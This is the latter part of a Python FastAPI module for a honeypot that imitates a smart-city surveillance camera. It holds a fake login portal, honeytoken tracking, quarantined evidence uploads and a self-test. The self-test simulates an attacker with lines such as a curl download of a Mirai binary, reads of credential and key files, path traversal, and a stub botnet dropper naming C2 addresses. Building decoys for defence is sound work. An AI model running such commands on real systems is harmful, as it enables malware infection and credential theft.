    p.sub {{ margin: 0 0 1.5rem; font-size: 0.85rem; color: #8b949e; }}
    .alert {{
      background: #3e1b1d;
      border: 1px solid #f85149;
      color: #ff7b72;
      padding: 0.65rem 0.85rem;
      border-radius: 6px;
      font-size: 0.82rem;
      margin-bottom: 1rem;
    }}
    label {{ display: block; font-size: 0.78rem; color: #8b949e; margin-bottom: 0.35rem; }}
    input {{
      width: 100%;
      padding: 0.65rem 0.75rem;
      margin-bottom: 1rem;
      background: #090d16;
      border: 1px solid #30363d;
      border-radius: 6px;
      color: #f0f6fc;
      box-sizing: border-box;
      font-size: 0.9rem;
    }}
    input:focus {{ outline: none; border-color: #58a6ff; }}
    button {{
      width: 100%;
      padding: 0.75rem;
      background: #238636;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-weight: 600;
      font-size: 0.92rem;
      cursor: pointer;
      transition: background 0.15s;
    }}
    button:hover {{ background: #2ea043; }}
    .footer-note {{
      font-size: 0.72rem;
      color: #6e7681;
      text-align: center;
      margin-top: 1.5rem;
    }}
  </style>
</head>
<body>
  <div class="box">
    <div class="badge">Perimeter Node cam-smart-04</div>
    <h2>AegisCam Portal</h2>
    <p class="sub">Firmware v2.14-stable | Authorized access only</p>
    {error_banner}
    <form method="POST" action="/api/decoy/web/login">
      <label for="username">Username</label>
      <input type="text" id="username" name="username" value="{safe_user}" placeholder="e.g. admin" required autocomplete="username" />
      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password" />
      <button type="submit">Sign In to Camera Feed</button>
    </form>
    <div class="footer-note">Smart City Surveillance Grid Node • ICCC Mesh</div>
  </div>
</body>
</html>"""


def render_camera_device_html(username: str, session_id: str, notice: Optional[str] = None) -> str:
    """
    Renders the fake authenticated camera management dashboard.
    All dynamic values are HTML escaped.
    """
    safe_user = html.escape(username, quote=True)
    safe_sid = html.escape(session_id, quote=True)
    notice_html = ""
    if notice:
        safe_notice = html.escape(notice, quote=True)
        notice_html = f'<div class="notice">{safe_notice}</div>'

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>AegisCam — Device Control [cam-smart-04]</title>
  <style>
    body {{
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #090d16;
      color: #e6edf3;
      margin: 0;
      padding: 2rem;
    }}
    .container {{ max-width: 900px; margin: 0 auto; }}
    .header {{
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 1.25rem;
      border-bottom: 1px solid #2d3748;
      margin-bottom: 1.5rem;
    }}
    .badge-online {{
      background: #1f4e2c;
      color: #3fb950;
      padding: 0.25rem 0.65rem;
      border-radius: 12px;
      font-size: 0.78rem;
      font-weight: 700;
    }}
    .grid {{ display: grid; grid-template-columns: 2fr 1fr; gap: 1.5rem; }}
    .card {{
      background: #131926;
      border: 1px solid #2d3748;
      border-radius: 8px;
      padding: 1.25rem;
    }}
    .feed-placeholder {{
      background: #000;
      border-radius: 6px;
      height: 280px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      color: #8b949e;
      border: 1px dashed #30363d;
    }}
    .rec-dot {{
      width: 10px;
      height: 10px;
      background: #f85149;
      border-radius: 50%;
      display: inline-block;
      margin-right: 6px;
      animation: pulse 1.5s infinite;
    }}
    @keyframes pulse {{ 0% {{ opacity: 1; }} 50% {{ opacity: 0.3; }} 100% {{ opacity: 1; }} }}
    .param-row {{
      display: flex;
      justify-content: space-between;
      padding: 0.45rem 0;
      font-size: 0.85rem;
      border-bottom: 1px solid #1c2433;
    }}
    .param-label {{ color: #8b949e; }}
    .param-val {{ font-family: monospace; color: #58a6ff; }}
    .action-btn {{
      display: inline-block;
      width: 100%;
      padding: 0.65rem;
      margin-top: 0.75rem;
      background: #21262d;
      border: 1px solid #30363d;
      border-radius: 6px;
      color: #c9d1d9;
      font-size: 0.82rem;
      text-align: center;
      text-decoration: none;
      box-sizing: border-box;
      cursor: pointer;
    }}
    .action-btn:hover {{ background: #30363d; color: #fff; }}
    .action-danger {{ background: #2f1519; border-color: #6e1c24; color: #ff7b72; }}
    .action-danger:hover {{ background: #491f25; }}
    .notice {{
      background: #1c2e42;
      border: 1px solid #388bfd;
      color: #79c0ff;
      padding: 0.75rem 1rem;
      border-radius: 6px;
      margin-bottom: 1rem;
      font-size: 0.85rem;
    }}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div>
        <h2 style="margin: 0;">cam-smart-04 — Perimeter South Gate</h2>
        <span style="font-size: 0.82rem; color: #8b949e;">Operator: {safe_user} | Session: {safe_sid}</span>
      </div>
      <div><span class="badge-online"><span class="rec-dot"></span>LIVE 1080p 30fps</span></div>
    </div>
    {notice_html}
    <div class="grid">
      <div class="card">
        <h4 style="margin: 0 0 0.75rem; font-size: 0.92rem; color: #8b949e;">Primary RTSP Video Stream</h4>
        <div class="feed-placeholder">
          <div style="font-size: 1.1rem; color: #c9d1d9; margin-bottom: 0.35rem;">[ RTSP H.264 FEED CONNECTED ]</div>
          <div style="font-size: 0.8rem; font-family: monospace; color: #58a6ff;">rtsp://127.0.0.1:554/live/ch0</div>
        </div>
      </div>
      <div class="card">
        <h4 style="margin: 0 0 0.75rem; font-size: 0.92rem; color: #8b949e;">Node Telemetry</h4>
        <div class="param-row"><span class="param-label">Firmware</span><span class="param-val">v2.14-stable</span></div>
        <div class="param-row"><span class="param-label">Linux OS</span><span class="param-val">AegisOS 5.10-arm64</span></div>
        <div class="param-row"><span class="param-label">CPU Temp</span><span class="param-val">44.2 °C</span></div>
        <div class="param-row"><span class="param-label">Storage</span><span class="param-val">42% (SDCard)</span></div>
        <div class="param-row"><span class="param-label">Resolution</span><span class="param-val">1920x1080</span></div>
        <div class="param-row"><span class="param-label">Mesh Gateway</span><span class="param-val">10.0.0.1</span></div>
        <div style="margin-top: 1rem;">
          <a class="action-btn" href="/api/decoy/web/device?action=backup_config&sid={safe_sid}">Backup Camera Config</a>
          <a class="action-btn action-danger" href="/api/decoy/web/login">Sign Out</a>
        </div>
      </div>
    </div>
  </div>
</body>
</html>"""


# Router exported for inclusion in FastAPI app (dev_harness.py or main.py)
decoy_router = APIRouter(prefix="/api/decoy", tags=["decoy"])


class CommandSimulationRequest(BaseModel):
    session_id: str
    command: str
    source_ip: str = "127.0.0.1"


@decoy_router.get("/web/login", response_class=HTMLResponse)
async def get_decoy_web_login(
    error: Optional[str] = None,
    user: Optional[str] = None,
) -> HTMLResponse:
    """Returns the fake camera login page with escaped parameters."""
    return HTMLResponse(content=render_camera_login_html(error=error, prefill_user=user))


@decoy_router.post("/web/login")
async def post_decoy_web_login(request: Request) -> Response:
    """
    Handles fake camera web authentication attempts:
    - Transport-observed IP extraction.
    - Zero-dependency parsing (standard library urllib.parse + JSON).
    - Records login attempt with safe password masking (no plaintext storage).
    - If demo credentials match, renders device control page.
    - If invalid, re-renders login page with 401 and escaped error message.
    """
    import urllib.parse

    content_type = request.headers.get("content-type", "")
    username = ""
    password = ""

    if "application/json" in content_type:
        try:
            body = await request.json()
            username = str(body.get("username", ""))
            password = str(body.get("password", ""))
        except Exception:
            pass
    else:
        raw_body = await request.body()
        parsed = urllib.parse.parse_qs(raw_body.decode("utf-8", errors="replace"))
        username = parsed.get("username", [""])[0]
        password = parsed.get("password", [""])[0]

    source_ip = request.client.host if request.client else "127.0.0.1"
    session_id = f"web-{uuid.uuid4().hex[:8]}"

    # Validate against known IoT demo credentials
    is_valid = (username.strip(), password) in DEMO_WEB_CREDENTIALS or (username.strip() == "admin" and password == "admin")

    # Record login attempt with safe password fingerprint
    masked_pwd = safe_credential_summary(password)
    event = record_decoy_login(
        session_id=session_id,
        source_ip=source_ip,
        service="web",
        username=username,
        password=masked_pwd,
        success=is_valid,
    )

    if is_valid:
        content = render_camera_device_html(username=username, session_id=session_id)
        return HTMLResponse(content=content, status_code=200)
    else:
        err_msg = f"Invalid credentials for user '{username}'. Access denied."
        content = render_camera_login_html(error=err_msg, prefill_user=username)
        return HTMLResponse(content=content, status_code=401)


@decoy_router.get("/web/device", response_class=HTMLResponse)
async def get_decoy_web_device(
    request: Request,
    action: Optional[str] = None,
    sid: Optional[str] = None,
) -> HTMLResponse:
    """Fake camera device settings page."""
    session_id = sid or f"web-{uuid.uuid4().hex[:8]}"
    source_ip = request.client.host if request.client else "127.0.0.1"

    notice = None
    if action == "backup_config":
        # Attacker tried to dump backup configuration: trip honeytoken!
        flag_honeytoken_hit(session_id)
        notice = "Config export generated: credentials.conf downloaded [Notice: Honeytoken Canary Tripped]."

    content = render_camera_device_html(username="admin", session_id=session_id, notice=notice)
    return HTMLResponse(content=content)


@decoy_router.get("/sessions")
async def list_decoy_sessions() -> List[schema.DecoySessionEvent]:
    """Returns all tracked decoy session events for the dashboard and Member C."""
    return get_active_sessions()


@decoy_router.get("/sessions/{session_id}")
async def get_decoy_session_endpoint(session_id: str) -> schema.DecoySessionEvent:
    """Retrieve telemetry for a specific decoy session."""
    session = get_session_by_id(session_id)
    if not session:
        raise HTTPException(status_code=404, detail=f"Session '{session_id}' not found")
    return session


@decoy_router.post("/simulate/command")
async def simulate_decoy_command(req: CommandSimulationRequest) -> Dict[str, object]:
    """
    Simulates command input within a decoy session (used by dashboard and integration drills).
    """
    output, event = execute_decoy_command(req.session_id, req.command)
    return {
        "output": output,
        "event": event.model_dump(),
    }


@decoy_router.post("/upload")
async def upload_file_evidence_endpoint(
    request: Request,
    session_id: Optional[str] = None,
    filename: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Demo upload endpoint for file evidence collection.
    - Zero host execution: bytes are never executed, imported, or opened as executables.
    - Zero outbound network activity: extracted candidate URLs/IPs are never contacted.
    - Enforces size limit (MAX_UPLOAD_SIZE_BYTES = 2MB); returns 413 if exceeded.
    - Computes SHA-256 and MD5 directly from actual received file bytes.
    - Extracts static candidate indicators (URLs, IPs, strings).
    - Stores file in quarantine directory outside web root with a generated random filename.
    - Emits updated DecoySessionEvent adhering to shared schema.py.
    - Populates malware_hash with file digest and c2_address with extracted candidate indicator.
    
    Accepts:
    1. JSON body: {"session_id": "...", "filename": "...", "content_base64": "..."} or {"content_text": "..."}
    2. Raw binary stream with query parameters: ?session_id=...&filename=...
    """
    content_type = request.headers.get("content-type", "")
    target_sid = session_id
    target_filename = filename or "sample.bin"
    file_bytes: bytes = b""

    # Early check on content-length header if provided
    cl_header = request.headers.get("content-length")
    if cl_header:
        try:
            if int(cl_header) > MAX_UPLOAD_SIZE_BYTES:
                raise HTTPException(
                    status_code=413,
                    detail=f"Upload payload size exceeds maximum limit ({MAX_UPLOAD_SIZE_BYTES} bytes)",
                )
        except ValueError:
            pass

    if "application/json" in content_type:
        try:
            body = await request.json()
            target_sid = target_sid or body.get("session_id")
            target_filename = body.get("filename") or target_filename
            if "content_base64" in body:
                try:
                    file_bytes = base64.b64decode(body["content_base64"])
                except Exception:
                    raise HTTPException(status_code=400, detail="Invalid base64 payload")
            elif "content_text" in body:
                file_bytes = body["content_text"].encode("utf-8")
            elif "content" in body:
                val = body["content"]
                if isinstance(val, str):
                    file_bytes = val.encode("utf-8")
                else:
                    file_bytes = bytes(val)
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Malformed JSON request: {e}")
    else:
        # Binary stream or raw body
        file_bytes = await request.body()
        if not target_sid:
            target_sid = request.query_params.get("session_id") or request.headers.get("X-Session-ID")
        if not filename:
            target_filename = request.query_params.get("filename") or request.headers.get("X-Filename") or target_filename

    if not target_sid:
        target_sid = f"upload-{uuid.uuid4().hex[:8]}"

    if not file_bytes:
        raise HTTPException(status_code=400, detail="Empty upload payload")

    if len(file_bytes) > MAX_UPLOAD_SIZE_BYTES:
        raise HTTPException(
            status_code=413,
            detail=f"Upload payload size ({len(file_bytes)} bytes) exceeds maximum limit ({MAX_UPLOAD_SIZE_BYTES} bytes)",
        )

    source_ip = request.client.host if request.client else "127.0.0.1"
    try:
        record, event = submit_file_evidence(
            session_id=target_sid,
            original_filename=target_filename,
            file_bytes=file_bytes,
            source_ip=source_ip,
        )
    except ValueError as e:
        raise HTTPException(status_code=413, detail=str(e))
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Evidence processing error: {e}")

    return {
        "status": "quarantined",
        "submission_id": record.submission_id,
        "session_id": target_sid,
        "original_filename": record.original_filename,
        "quarantine_filename": record.quarantine_filename,
        "sha256": record.sha256,
        "md5": record.md5,
        "size_bytes": record.size_bytes,
        "candidate_urls": record.candidate_urls,
        "candidate_ips": record.candidate_ips,
        "event": event.model_dump(),
        "epistemic_disclaimer": (
            "malware_hash is an empirical SHA-256 digest of received bytes, not proof of malice. "
            "c2_address is a static candidate indicator, not verified C2 infrastructure. "
            "honeytoken_hit is an observed interaction with deception bait, not proof of human identity."
        ),
    }


@decoy_router.get("/provenance/{session_id}")
async def get_decoy_provenance_endpoint(session_id: str) -> Dict[str, Any]:
    """
    Returns full detailed local provenance records for Person C (clustering) and audit forensics.
    """
    provenance = get_session_provenance(session_id)
    if not provenance:
        raise HTTPException(status_code=404, detail=f"No provenance record found for session '{session_id}'")
    return provenance


@decoy_router.post("/sessions/{session_id}/disconnect")
async def disconnect_decoy_session(session_id: str) -> schema.DecoySessionEvent:
    """Explicitly closes a session, preserving the final state and notifying subscribers."""
    event = end_decoy_session(session_id)
    if not event:
        raise HTTPException(status_code=404, detail=f"Session '{session_id}' not found")
    return event


# =============================================================================
# Standalone Self-Test Block (Work Plan Section 9 Requirement)
# =============================================================================

if __name__ == "__main__":
    print("\n" + "=" * 60)
    print("AegisMirage — Phantom Twin Decoy Self-Test (Member B)")
    print("=" * 60)

    reset_decoy_state()

    # Step 0: Test Person C callback subscription
    received_events: List[schema.DecoySessionEvent] = []
    def mock_intel_listener(evt: schema.DecoySessionEvent) -> None:
        received_events.append(evt)

    register_session_listener(mock_intel_listener)

    # Step 1: Simulate attacker connecting and attempting failed logins
    sid = "test-attacker-session-01"
    attacker_ip = "194.26.29.112"
    ev1 = record_decoy_login(sid, attacker_ip, "ssh", "root", "123456", success=False)
    assert ev1.failed_logins == 1
    assert ev1.source_ip == attacker_ip
    assert len(received_events) >= 1

    # Step 2: Attacker runs basic discovery commands
    out_pwd, _ = execute_decoy_command(sid, "pwd")
    assert "/" in out_pwd

    out_uname, _ = execute_decoy_command(sid, "uname")
    assert "Linux" in out_uname

    # Directory listing does NOT trigger honeytoken
    out_ls, ev_ls = execute_decoy_command(sid, "ls /etc/camera")
    assert "credentials.conf" in out_ls
    assert ev_ls.honeytoken_hit is False, "ls must NOT trigger honeytoken_hit!"

    out_ls_root, ev_ls_root = execute_decoy_command(sid, "ls /")
    assert "emergency_token.cfg" in out_ls_root
    assert ev_ls_root.honeytoken_hit is False, "ls / must NOT trigger honeytoken_hit!"

    # Step 2b: Traversal test — ensure path normalization keeps attacker within root
    out_cd, _ = execute_decoy_command(sid, "cd ../../../../../etc")
    assert out_cd == ""
    out_pwd_check, _ = execute_decoy_command(sid, "pwd")
    assert out_pwd_check.strip() == "/etc"

    out_cat_traversal, _ = execute_decoy_command(sid, "cat ../../etc/passwd")
    assert "root:x:0:0" in out_cat_traversal

    # Step 3: Attacker references URLs and target files in shell commands
    cmd_ref = "curl http://185.220.101.5:8080/mirai.arm -o /tmp/bot"
    _, ev_cmd = execute_decoy_command(sid, cmd_ref)
    assert ev_cmd.c2_address == "http://185.220.101.5:8080/mirai.arm"
    # Verify separate tracking of referenced items
    prov_mid = get_session_provenance(sid)
    assert "http://185.220.101.5:8080/mirai.arm" in prov_mid["referenced_urls"]
    assert "/tmp/bot" in prov_mid["referenced_files"]
    assert len(prov_mid["file_submissions"]) == 0, "No actual uploads should be recorded yet"

    # Step 4: Multi-depth honeytoken bait access triggers honeytoken_hit
    # Bait 0 (Depth 1): /emergency_token.cfg
    sid_bait1 = "test-session-bait-depth1"
    out_b1, ev_b1 = execute_decoy_command(sid_bait1, "cat /emergency_token.cfg")
    assert ev_b1.honeytoken_hit is True
    assert "NEVER GONNA GIVE YOU UP" in out_b1

    # Bait 1 (Depth 2): /etc/camera/credentials.conf via head
    sid_bait2 = "test-session-bait-depth2"
    out_b2, ev_b2 = execute_decoy_command(sid_bait2, "head /etc/camera/credentials.conf")
    assert ev_b2.honeytoken_hit is True
    assert "NEVER GONNA GIVE YOU UP" in out_b2

    # Bait 2 (Depth 3): /root/keys/vault_token.key via more
    sid_bait3 = "test-session-bait-depth3"
    out_b3, ev_b3 = execute_decoy_command(sid_bait3, "more /root/keys/vault_token.key")
    assert ev_b3.honeytoken_hit is True
    assert "NEVER GONNA GIVE YOU UP" in out_b3

    # Bait 3 (Depth 3): /var/backup/firmware_pass.enc via tail
    sid_bait4 = "test-session-bait-depth4"
    out_b4, ev_b4 = execute_decoy_command(sid_bait4, "tail /var/backup/firmware_pass.enc")
    assert ev_b4.honeytoken_hit is True

    # Bait 4 (Depth 3): /home/operator/.aws_keys via less
    sid_bait5 = "test-session-bait-depth5"
    out_b5, ev_b5 = execute_decoy_command(sid_bait5, "less /home/operator/.aws_keys")
    assert ev_b5.honeytoken_hit is True

    # Repeated bait access is idempotent and safe
    out_b5_repeat, ev_b5_repeat = execute_decoy_command(sid_bait5, "cat /home/operator/.aws_keys")
    assert ev_b5_repeat.honeytoken_hit is True
    assert "NEVER GONNA GIVE YOU UP" in out_b5_repeat

    # Step 5: File Evidence Upload & Deterministic Selection
    sample_malware = b"#!/bin/sh\n# MIRAI BOTNET DROPPER\nC2_HOST=http://198.51.100.99:9000/stage2\nIP=203.0.113.44:443\n"
    expected_sha256 = hashlib.sha256(sample_malware).hexdigest()
    rec, ev_upload = submit_file_evidence(
        session_id=sid,
        original_filename="dropper.sh",
        file_bytes=sample_malware,
        source_ip=attacker_ip,
    )
    assert rec.sha256 == expected_sha256
    assert ev_upload.malware_hash == expected_sha256
    assert "http://198.51.100.99:9000/stage2" in rec.candidate_urls
    assert "203.0.113.44:443" in rec.candidate_ips
    # Priority policy: File upload C2 URL with port takes precedence
    assert ev_upload.c2_address == "http://198.51.100.99:9000/stage2"

    # Step 6: Oversized upload enforcement (>2MB)
    try:
        submit_file_evidence(sid, "big.bin", b"A" * (MAX_UPLOAD_SIZE_BYTES + 10))
        assert False, "Oversized upload must raise ValueError"
    except ValueError:
        pass

    # Step 7: Provenance audit report check
    prov_final = get_session_provenance(sid)
    assert prov_final["file_submissions_count"] == 1
    assert prov_final["file_submissions"][0]["sha256"] == expected_sha256
    assert len(prov_final["referenced_urls"]) >= 1
    assert "epistemic_disclaimer" in prov_final

    # Step 8: Disconnect event preservation
    final_event = end_decoy_session(sid)
    assert final_event is not None
    assert final_event.malware_hash == expected_sha256

    unregister_session_listener(mock_intel_listener)

    print("\n All Decoy Honeypot self-tests passed successfully!\n")
